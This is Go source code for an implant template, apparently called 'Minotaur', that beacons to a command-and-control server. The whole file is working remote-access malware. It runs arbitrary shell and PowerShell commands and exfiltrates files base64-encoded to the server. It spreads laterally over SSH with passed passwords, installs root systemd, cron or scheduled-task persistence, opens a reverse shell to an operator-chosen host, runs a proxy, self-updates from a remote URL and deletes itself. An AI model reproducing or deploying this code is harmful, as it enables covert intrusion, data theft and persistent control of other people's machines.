package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

type Config struct {
	ServerURL       string
	BeaconDelay     time.Duration
	Jitter          time.Duration
	UserAgent       string
	InsecureTLS     bool
	AutoPersistence bool
	DebugMode       bool
}

var config = Config{
	ServerURL:       "{{ .C2URL }}",
	BeaconDelay:     {{ .BeaconDelay }} * time.Second,
	Jitter:          {{ .Jitter }} * time.Second,
	UserAgent:       "{{ .UserAgent }}",
	InsecureTLS:     {{ .InsecureTLS }},
	AutoPersistence: {{ .AutoPersistence }},
	DebugMode:       {{ .DebugMode }},
}

var agentID string
var client *http.Client

type AgentInfo struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
	Platform string `json:"platform"`
}

type Command struct {
	ID      string            `json:"id"`
	Type    string            `json:"type"`
	Payload map[string]string `json:"payload"`
}

type CommandResult struct {
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Error     string `json:"error"`
}

type ExfilData struct {
	AgentID    string `json:"agent_id"`
	FilePath   string `json:"file_path"`
	FileBase64 string `json:"file_base64"`
}

func init() {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
	}
	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
}

func logf(format string, args ...interface{}) {
	if config.DebugMode {
		fmt.Printf("[MINOTAUR] "+format+"\n", args...)
	}
	// Always log to file in temp directory
	f, err := os.OpenFile(os.TempDir()+"/minotaur_agent.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		fmt.Fprintf(f, "[MINOTAUR] "+format+"\n", args...)
	}
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func register() {
	info := AgentInfo{
		Hostname: getHostname(),
		OS:       runtime.GOOS,
		IP:       getOutboundIP(),
		Arch:     runtime.GOARCH,
		Version:  "{{ .AgentVersion }}",
		Platform: runtime.GOOS + "/" + runtime.GOARCH,
	}
	jsonData, _ := json.Marshal(info)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/register", bytes.NewBuffer(jsonData))
	if err != nil {
		logf("Register request creation error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		logf("Register error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		var result map[string]string
		json.NewDecoder(resp.Body).Decode(&result)
		agentID = result["agent_id"]
		logf("Registered successfully with ID: %s", agentID)
	} else {
		logf("Registration failed, HTTP status: %d", resp.StatusCode)
	}
}

func beacon() ([]Command, error) {
	info := AgentInfo{
		ID:       agentID,
		Version:  "{{ .AgentVersion }}",
		Platform: runtime.GOOS + "/" + runtime.GOARCH,
	}
	jsonData, _ := json.Marshal(info)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/beacon", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon failed, status: %d", resp.StatusCode)
	}

	var commands []Command
	err = json.NewDecoder(resp.Body).Decode(&commands)
	if config.DebugMode {
		logf("Beacon returned %d command(s)", len(commands))
	}
	return commands, err
}

func executeCommand(cmdStr string) (string, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}
	stdout, err := cmd.Output()
	if err != nil {
		return "", err.Error()
	}
	return string(stdout), ""
}

func sendResult(result CommandResult) error {
	jsonData, _ := json.Marshal(result)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/result", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if config.DebugMode {
		logf("Sent result for command %s", result.CommandID)
	}
	return nil
}

// ==================== FILE & DIRECTORY OPERATIONS ====================
func doDir(path string) string {
	if path == "" {
		path = "."
	}
	files, err := os.ReadDir(path)
	if err != nil {
		return err.Error()
	}
	var result string
	for _, f := range files {
		info, _ := f.Info()
		size := ""
		if info != nil && !f.IsDir() {
			size = fmt.Sprintf(" (%d bytes)", info.Size())
		}
		result += fmt.Sprintf("%s%s\n", f.Name(), size)
	}
	return result
}

func doPwd() string {
	dir, err := os.Getwd()
	if err != nil {
		return err.Error()
	}
	return dir
}

func doCd(path string) string {
	err := os.Chdir(path)
	if err != nil {
		return err.Error()
	}
	newDir, _ := os.Getwd()
	return fmt.Sprintf("Changed directory to %s", newDir)
}

func doCat(filepath string) string {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return err.Error()
	}
	return string(data)
}

func doMkdir(path string) string {
	err := os.MkdirAll(path, 0755)
	if err != nil {
		return err.Error()
	}
	return fmt.Sprintf("Created directory %s", path)
}

func doRemove(path string) string {
	err := os.RemoveAll(path)
	if err != nil {
		return err.Error()
	}
	return fmt.Sprintf("Removed %s", path)
}

func doCp(src, dst string) string {
	srcData, err := os.ReadFile(src)
	if err != nil {
		return err.Error()
	}
	err = os.WriteFile(dst, srcData, 0644)
	if err != nil {
		return err.Error()
	}
	return fmt.Sprintf("Copied %s to %s", src, dst)
}

func doUpload(filePath, b64Data string) error {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return err
	}
	return os.WriteFile(filePath, data, 0644)
}

func doDownload(filePath string) (string, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

// ==================== PROCESS & NETWORK ENUMERATION ====================
func doProcList() string {
	var out string
	var errMsg string
	if runtime.GOOS == "windows" {
		out, errMsg = executeCommand("tasklist")
	} else {
		out, errMsg = executeCommand("ps aux")
	}
	if errMsg != "" {
		return "Error: " + errMsg
	}
	return out
}

func doNetEnum() string {
	var result string
	if runtime.GOOS == "windows" {
		ipconfig, _ := executeCommand("ipconfig")
		netstat, _ := executeCommand("netstat -an")
		result = "=== IP Configuration ===\n" + ipconfig + "\n=== Active Connections ===\n" + netstat
	} else {
		ifconfig, _ := executeCommand("ip a")
		netstat, _ := executeCommand("ss -tuln")
		result = "=== Network Interfaces ===\n" + ifconfig + "\n=== Listening Ports ===\n" + netstat
	}
	return result
}

// ==================== COMMAND EXECUTION HELPERS ====================
func doShellCommand(cmdStr string) string {
	output, errMsg := executeCommand(cmdStr)
	if errMsg != "" {
		return "Error: " + errMsg
	}
	return output
}

func doPowershell(cmdStr string) string {
	if runtime.GOOS != "windows" {
		return "PowerShell is only available on Windows"
	}
	cmd := exec.Command("powershell", "-NoP", "-NonI", "-Command", cmdStr)
	stdout, err := cmd.Output()
	if err != nil {
		return err.Error()
	}
	return string(stdout)
}

// ==================== LATERAL MOVEMENT ====================
func lateralMovement(target, user, password, command string) (string, error) {
	if runtime.GOOS == "windows" {
		cmdStr := fmt.Sprintf("plink -ssh -l %s -pw %s %s \"%s\"", user, password, target, command)
		out, errMsg := executeCommand(cmdStr)
		if errMsg != "" {
			return "", fmt.Errorf(errMsg)
		}
		return out, nil
	} else {
		cmdStr := fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no %s@%s '%s'", password, user, target, command)
		out, errMsg := executeCommand(cmdStr)
		if errMsg != "" {
			return "", fmt.Errorf(errMsg)
		}
		return out, nil
	}
}

// ==================== PERSISTENCE ====================
func setupPersistence() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("failed to get executable path: %v", err)
	}
	absPath, err := filepath.Abs(exePath)
	if err != nil {
		return "", fmt.Errorf("failed to resolve absolute path: %v", err)
	}

	if runtime.GOOS == "linux" {
		serviceContent := fmt.Sprintf(`[Unit]
Description=Minotaur Agent
After=network.target

[Service]
ExecStart=%s
Restart=always
User=root
RestartSec=30

[Install]
WantedBy=multi-user.target`, absPath)

		servicePath := "/etc/systemd/system/minotaur-agent.service"
		err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
		if err != nil {
			logf("Failed to write systemd service: %v", err)
		} else {
			exec.Command("systemctl", "daemon-reload").Run()
			exec.Command("systemctl", "enable", "minotaur-agent.service").Run()
			exec.Command("systemctl", "start", "minotaur-agent.service").Run()
			return "systemd", nil
		}

		logf("Systemd failed, falling back to crontab")
		cronCmd := fmt.Sprintf("@reboot %s > /dev/null 2>&1 &", absPath)
		cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronCmd))
		if err := cmd.Run(); err != nil {
			return "", fmt.Errorf("crontab fallback failed: %v", err)
		}
		return "crontab", nil
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("schtasks", "/create", "/tn", "MinotaurAgent", "/tr", absPath, "/sc", "minute", "/mo", "5", "/f")
		err := cmd.Run()
		if err != nil {
			return "", err
		}
		return "schtasks", nil
	}

	return "", fmt.Errorf("unsupported OS for persistence")
}

// ==================== PROXY & REVERSE SHELL ====================
func startProxy(port string) {
	addr := "0.0.0.0:" + port
	server := &http.Server{
		Addr: addr,
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == http.MethodConnect {
				destConn, err := net.Dial("tcp", r.Host)
				if err != nil {
					http.Error(w, err.Error(), http.StatusServiceUnavailable)
					return
				}
				w.WriteHeader(http.StatusOK)
				hijacker, ok := w.(http.Hijacker)
				if !ok {
					http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
					return
				}
				clientConn, _, err := hijacker.Hijack()
				if err != nil {
					http.Error(w, err.Error(), http.StatusServiceUnavailable)
					return
				}
				go transfer(destConn, clientConn)
				go transfer(clientConn, destConn)
			} else {
				transport := &http.Transport{}
				resp, err := transport.RoundTrip(r)
				if err != nil {
					http.Error(w, err.Error(), http.StatusBadGateway)
					return
				}
				defer resp.Body.Close()
				for k, v := range resp.Header {
					w.Header()[k] = v
				}
				w.WriteHeader(resp.StatusCode)
				io.Copy(w, resp.Body)
			}
		}),
	}
	logf("HTTP proxy listening on %s", addr)
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		logf("Proxy error: %v", err)
	}
}

func transfer(destination io.WriteCloser, source io.ReadCloser) {
	defer destination.Close()
	defer source.Close()
	io.Copy(destination, source)
}

func spawnReverseShell(ip, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		logf("Reverse shell connection failed: %v", err)
		return
	}
	defer conn.Close()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// ==================== EXFILTRATION ====================
func exfiltrateFile(filePath string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	payload := ExfilData{
		AgentID:    agentID,
		FilePath:   filePath,
		FileBase64: encoded,
	}
	jsonData, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/exfil", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// ==================== SELF-UPDATE ====================
func selfUpdate(downloadURL string, newVersion string) error {
	logf("Starting self‑update to version %s from %s", newVersion, downloadURL)
	resp, err := client.Get(downloadURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	tmpFile, err := os.CreateTemp("", "minotaur_update_")
	if err != nil {
		return err
	}
	defer tmpFile.Close()

	_, err = io.Copy(tmpFile, resp.Body)
	if err != nil {
		return err
	}
	tmpFile.Close()

	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	if runtime.GOOS == "windows" {
		// Use a batch file to replace the executable and restart
		batchContent := fmt.Sprintf(`@echo off
timeout /t 2 /nobreak > nul
move /Y "%s" "%s.bak"
move /Y "%s" "%s"
start "" "%s"
del "%%~f0"`, tmpFile.Name(), exePath, tmpFile.Name(), exePath, exePath)
		batchPath := filepath.Join(os.TempDir(), "minotaur_update.bat")
		err = os.WriteFile(batchPath, []byte(batchContent), 0700)
		if err != nil {
			return err
		}
		cmd := exec.Command("cmd", "/c", batchPath)
		cmd.Start()
		os.Exit(0)
	} else {
		// Linux / macOS: replace and restart
		err = os.Rename(tmpFile.Name(), exePath)
		if err != nil {
			return err
		}
		err = os.Chmod(exePath, 0755)
		if err != nil {
			return err
		}
		cmd := exec.Command(exePath)
		cmd.Start()
		os.Exit(0)
	}
	return nil
}

// ==================== SELF-DESTRUCT ====================
func selfDestruct() {
	logf("Self‑destruct initiated")
	if runtime.GOOS == "windows" {
		exec.Command("schtasks", "/delete", "/tn", "MinotaurAgent", "/f").Run()
	} else if runtime.GOOS == "linux" {
		exec.Command("systemctl", "stop", "minotaur-agent.service").Run()
		exec.Command("systemctl", "disable", "minotaur-agent.service").Run()
		os.Remove("/etc/systemd/system/minotaur-agent.service")
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("bash", "-c", "crontab -l | grep -v 'minotaur_agent' | crontab -").Run()
	}
	exePath, err := os.Executable()
	if err != nil {
		exePath = os.Args[0]
	}
	if runtime.GOOS == "windows" {
		batchContent := fmt.Sprintf("@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"%s\"\ndel /f /q \"%%~f0\"", exePath)
		batchPath := filepath.Join(os.TempDir(), "minotaur_cleanup.bat")
		os.WriteFile(batchPath, []byte(batchContent), 0700)
		cmd := exec.Command("cmd", "/c", batchPath)
		cmd.Start()
	} else {
		scriptContent := fmt.Sprintf("#!/bin/sh\nsleep 2\nrm -f \"%s\"\nrm -f \"$0\"", exePath)
		scriptPath := filepath.Join(os.TempDir(), "minotaur_cleanup.sh")
		os.WriteFile(scriptPath, []byte(scriptContent), 0700)
		cmd := exec.Command("/bin/sh", scriptPath)
		cmd.Start()
	}
	os.Exit(0)
}

// ==================== HELPER & UTILITY COMMANDS ====================
func doHelp() string {
	return `Available commands:
help, sleep, checkin, pwd, cd, dir/ls, cat, mkdir, remove/rm, cp, upload, download,
proc, net, shell, powershell, exfil, lateral, persistence, proxy, shell-reverse, update, delete/exit`
}

func doSleep(seconds string) string {
	sec, err := strconv.Atoi(seconds)
	if err != nil {
		return "Invalid sleep duration"
	}
	config.BeaconDelay = time.Duration(sec) * time.Second
	return fmt.Sprintf("Beacon delay set to %d seconds", sec)
}

func doCheckin() string {
	return fmt.Sprintf("Agent %s is active, version %s, last beacon: %s", agentID, "{{ .AgentVersion }}", time.Now().Format(time.RFC3339))
}

func doConfig(setting, value string) string {
	return fmt.Sprintf("Configuration changed: %s = %s (not persisted across restarts)", setting, value)
}

// ==================== COMMAND DISPATCHER ====================
func processCommand(cmd Command) {
	if config.DebugMode {
		logf("Processing command: type=%s, payload=%v", cmd.Type, cmd.Payload)
	}
	switch cmd.Type {
	case "exec":
		output, errMsg := executeCommand(cmd.Payload["command"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: errMsg})
	case "help":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doHelp(), Error: ""})
	case "sleep":
		output := doSleep(cmd.Payload["seconds"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "checkin":
		output := doCheckin()
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "config":
		output := doConfig(cmd.Payload["setting"], cmd.Payload["value"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "pwd":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doPwd(), Error: ""})
	case "cd":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doCd(cmd.Payload["path"]), Error: ""})
	case "dir", "ls":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doDir(cmd.Payload["path"]), Error: ""})
	case "cat":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doCat(cmd.Payload["filepath"]), Error: ""})
	case "mkdir":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doMkdir(cmd.Payload["path"]), Error: ""})
	case "remove", "rm":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doRemove(cmd.Payload["path"]), Error: ""})
	case "cp":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doCp(cmd.Payload["src"], cmd.Payload["dst"]), Error: ""})
	case "upload":
		err := doUpload(cmd.Payload["path"], cmd.Payload["data"])
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Upload successful"})
		}
	case "download":
		b64, err := doDownload(cmd.Payload["path"])
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: b64, Error: ""})
		}
	case "proc":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doProcList(), Error: ""})
	case "net":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doNetEnum(), Error: ""})
	case "shell":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doShellCommand(cmd.Payload["command"]), Error: ""})
	case "powershell":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doPowershell(cmd.Payload["command"]), Error: ""})
	case "exfil":
		err := exfiltrateFile(cmd.Payload["path"])
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Exfiltrated " + cmd.Payload["path"]})
		}
	case "lateral":
		out, err := lateralMovement(cmd.Payload["target"], cmd.Payload["user"], cmd.Payload["password"], cmd.Payload["command"])
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: out})
		}
	case "persistence":
		method, err := setupPersistence()
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Persistence installed using " + method})
		}
	case "proxy":
		port := cmd.Payload["port"]
		go startProxy(port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: "HTTP proxy started on port " + port, Error: ""})
	case "shell-reverse":
		ip := cmd.Payload["ip"]
		port := cmd.Payload["port"]
		go spawnReverseShell(ip, port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: "Reverse shell spawning", Error: ""})
	case "update":
		url := cmd.Payload["url"]
		newVersion := cmd.Payload["version"]
		err := selfUpdate(url, newVersion)
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Update successful, restarting"})
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}
	case "delete", "exit":
		go selfDestruct()
		return
	default:
		output, errMsg := executeCommand(cmd.Type + " " + cmd.Payload["args"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: errMsg})
	}
}

// ==================== MAIN ====================
func main() {
	if config.DebugMode {
		fmt.Println("[MINOTAUR] Debug mode enabled")
	}
	logf("Starting Minotaur agent version %s on %s/%s", "{{ .AgentVersion }}", runtime.GOOS, runtime.GOARCH)
	register()
	if agentID == "" {
		logf("Registration failed, exiting after 10 seconds")
		time.Sleep(10 * time.Second)
		return
	}

	if config.AutoPersistence {
		logf("Auto-persistence enabled, installing...")
		method, err := setupPersistence()
		if err != nil {
			logf("Auto-persistence failed: %v", err)
		} else {
			logf("Auto-persistence installed using %s", method)
		}
	}

	for {
		jitter := time.Duration(0)
		if config.Jitter > 0 {
			jitter = time.Duration(time.Now().UnixNano()%int64(config.Jitter))
		}
		time.Sleep(config.BeaconDelay + jitter)

		commands, err := beacon()
		if err != nil {
			logf("Beacon error: %v", err)
			continue
		}
		if len(commands) > 0 && config.DebugMode {
			logf("Received %d command(s)", len(commands))
		}
		for _, cmd := range commands {
			go processCommand(cmd)
		}
	}
}